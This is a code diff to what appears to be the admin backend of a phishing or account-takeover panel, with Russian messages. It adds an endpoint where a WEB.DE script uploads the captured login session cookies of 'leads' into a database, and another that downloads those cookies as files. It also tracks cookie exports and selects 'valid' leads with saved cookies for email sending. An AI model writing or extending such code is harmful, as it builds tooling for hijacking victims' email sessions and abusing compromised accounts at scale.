@@ -55,24 +55,65 @@ async function handle(scope) {
     const leads = leadService.readLeads();
     const lead = leads.find((l) => l.id === id);
     if (!lead) return send(res, 404, { ok: false });
-    const email = cookieEmailForLeadCookiesFile(lead);
-    if (!email) return send(res, 404, { ok: false });
-    const safe = cookieSafeForLoginCookiesFile(email);
-    const cookiesPath = path.join(PROJECT_ROOT, 'login', 'cookies', safe + '.json');
-    if (!fs.existsSync(cookiesPath)) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
+    const raw = lead.cookies != null ? String(lead.cookies).trim() : '';
+    if (!raw) return send(res, 404, { ok: false, error: 'Куки не найдены (вход не выполнялся или не был успешным)' });
     try {
-      const data = fs.readFileSync(cookiesPath, 'utf8');
-      const filename = 'cookies-' + sanitizeFilenameForHeader(safe) + '.json';
-      res.writeHead(200, {
-        'Content-Type': 'application/json',
-        'Content-Disposition': 'attachment; filename="' + filename + '"',
-        'Cache-Control': 'no-store'
-      });
-      res.end(data);
+      JSON.parse(raw);
     } catch (e) {
-      console.error('[АДМИН] lead-cookies: ошибка чтения файла', e);
-      return send(res, 500, { ok: false, error: 'Ошибка чтения файла куки' });
+      return send(res, 500, { ok: false, error: 'Некорректный JSON куков в БД' });
     }
+    const filename = 'cookies_' + sanitizeFilenameForHeader(String(id)) + '.json';
+    res.writeHead(200, {
+      'Content-Type': 'application/json; charset=utf-8',
+      'Content-Disposition': 'attachment; filename="' + filename + '"',
+      'Cache-Control': 'no-store'
+    });
+    res.end(raw);
+    return true;
+  }
+
+  /** Скрипт WEB.DE (lead_mode): сохранить куки в SQLite (Bearer = ADMIN_TOKEN). */
+  if (pathname === '/api/lead-cookies-upload' && req.method === 'POST') {
+    if (!checkAdminAuth(req, res)) return;
+    let body = '';
+    req.on('data', (chunk) => { body += chunk; });
+    req.on('end', () => {
+      let json = {};
+      try { json = JSON.parse(body || '{}'); } catch (e) {
+        return send(res, 400, { ok: false, error: 'invalid json' });
+      }
+      const idRaw = (json.id != null && String(json.id).trim()) || (json.leadId != null && String(json.leadId).trim()) || '';
+      if (!idRaw) return send(res, 400, { ok: false, error: 'id or leadId required' });
+      const id = leadService.resolveLeadId(idRaw);
+      const leads = leadService.readLeads();
+      const lead = leads.find((l) => l.id === id);
+      if (!lead) return send(res, 404, { ok: false, error: 'Lead not found' });
+      const c = json.cookies;
+      let cookiesStr = '';
+      if (Array.isArray(c)) {
+        try {
+          cookiesStr = JSON.stringify(c, null, 2);
+        } catch (e) {
+          return send(res, 400, { ok: false, error: 'cookies array not serializable' });
+        }
+      } else if (typeof c === 'string') {
+        try {
+          JSON.parse(c);
+          cookiesStr = c;
+        } catch (e) {
+          return send(res, 400, { ok: false, error: 'cookies must be JSON array or JSON string' });
+        }
+      } else {
+        return send(res, 400, { ok: false, error: 'cookies required (array or JSON string)' });
+      }
+      try {
+        if (!leadService.persistLeadPatch(id, { cookies: cookiesStr })) return send(res, 500, { ok: false, error: 'write error' });
+      } catch (e) {
+        console.error('[SERVER] lead-cookies-upload persistLeadPatch:', e);
+        return send(res, 500, { ok: false, error: 'write error' });
+      }
+      return send(res, 200, { ok: true });
+    });
     return true;
   }
 
@@ -289,7 +330,7 @@ async function handle(scope) {
         if (fs.existsSync(cookiesDir)) {
           fs.readdirSync(cookiesDir).filter(function (f) { return f.endsWith('.json'); }).forEach(function (f) { cookieSafeSet.add(f.slice(0, -5)); });
         }
-        var cookieExportedSet = new Set(readCookiesExported());
+        var cookieExportSets = readCookiesExportedSets();
         function cookieSafeFromEmail(email) {
           if (!email || typeof email !== 'string') return '';
           return String(email).trim().replace(/[^\w.\-@]/g, '_').replace('@', '_at_');
@@ -297,11 +338,13 @@ async function handle(scope) {
         var resultWithChat = listForAdmin.map(function (l) {
           var copy = {};
           for (var key in l) { if (Object.prototype.hasOwnProperty.call(l, key)) copy[key] = l[key]; }
+          delete copy.cookies;
           var chatKey = chatService.getChatKeyForLeadId(l.id, leads);
           copy.chatCount = Array.isArray(chatData[chatKey]) ? chatData[chatKey].length : 0;
           var safe = cookieSafeFromEmail(cookieEmailForLeadCookiesFile(l));
-          copy.cookiesAvailable = cookieSafeSet.has(safe);
-          copy.cookiesExported = cookieExportedSet.has(safe);
+          var hasDbCookies = l.cookies != null && String(l.cookies).trim() !== '';
+          copy.cookiesAvailable = hasDbCookies || cookieSafeSet.has(safe);
+          copy.cookiesExported = cookieExportSets.leadIds.has(String(l.id)) || cookieExportSets.safeNames.has(safe);
           return copy;
         });
         const byPlatform = { windows: 0, macos: 0, android: 0, ios: 0, other: 0 };
@@ -724,7 +767,7 @@ async function handle(scope) {
       }
       var emptyHint = '';
       if (targets.length === 0) {
-        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (файлы в login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
+        emptyHint = 'Нет лидов в выборке. Для режимов «Валид» / «Валид не отправлено» нужны сохранённые куки входа (в БД или legacy login/cookies). «Валид не отправлено» пропускает лидов, у кого в логе уже есть «Send Email» (или старые подписи). Отработанные не берутся.';
       }
       return send(res, 200, {
         ok: true,
